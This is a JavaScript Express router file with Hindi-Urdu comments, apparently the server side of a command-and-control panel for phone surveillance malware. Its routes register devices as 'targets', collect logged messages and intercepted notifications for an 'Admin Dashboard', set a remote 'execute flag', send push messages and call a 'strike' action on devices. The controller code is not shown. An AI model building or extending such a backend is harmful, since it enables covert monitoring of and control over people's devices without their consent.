import express from 'express';
import { handleSync } from '../controllers/syncController.js';
import { getAllLoggedMessages } from '../database/syncMessage.js';
import { verifyApiKey } from '../middlewares/authMiddleware.js'; // .js zaroori hai
import { registerDevice, updateToken, getTargetsList } from '../controllers/deviceController.js';
import { getEngineStatus, updateEngineStatus, handleUpdateExecute, handleGetExecute } from '../controllers/engineController.js';
import { handleIncomingNotification, fetchAllNotifications } from '../controllers/notificationController.js';
import { sendFCMToken, strikeDevice } from '../controllers/fcmContoller.js';
import { registerNotifyToken } from '../database/registerNotifyToken.js'; // Import the function

const router = express.Router();

// POST request aayegi '/api/sync' par, aur syncController handle karega
router.post('/sync', verifyApiKey, handleSync);
router.post('/register-device', verifyApiKey, registerDevice);
router.post('/update-token', verifyApiKey, updateToken);
router.post('/update-engine-status', verifyApiKey, updateEngineStatus);
router.post('/update-execute-flag', verifyApiKey, handleUpdateExecute);
router.get('/engine-status', verifyApiKey, getEngineStatus);
router.get('/targets', verifyApiKey, getTargetsList);
router.get('/execute-flag', verifyApiKey, handleGetExecute); // GET request for execute flag

router.get('/messages', verifyApiKey, async (req, res) => {
    try {
        console.log(`\n[+] Admin Dashboard requested Logs Matrix`);
        const messages = await getAllLoggedMessages();
        res.status(200).json({ success: true, data: messages });
    } catch (error) {
        res.status(500).json({ success: false, message: "Internal Server Error" });
    }
});

router.post('/notification', verifyApiKey, handleIncomingNotification);
router.post('/register-notify-token', verifyApiKey, registerNotifyToken);
router.get('/notifications', verifyApiKey, fetchAllNotifications);
router.post('/send-fcm', verifyApiKey, sendFCMToken);
router.post('/strike', verifyApiKey, strikeDevice);


export default router;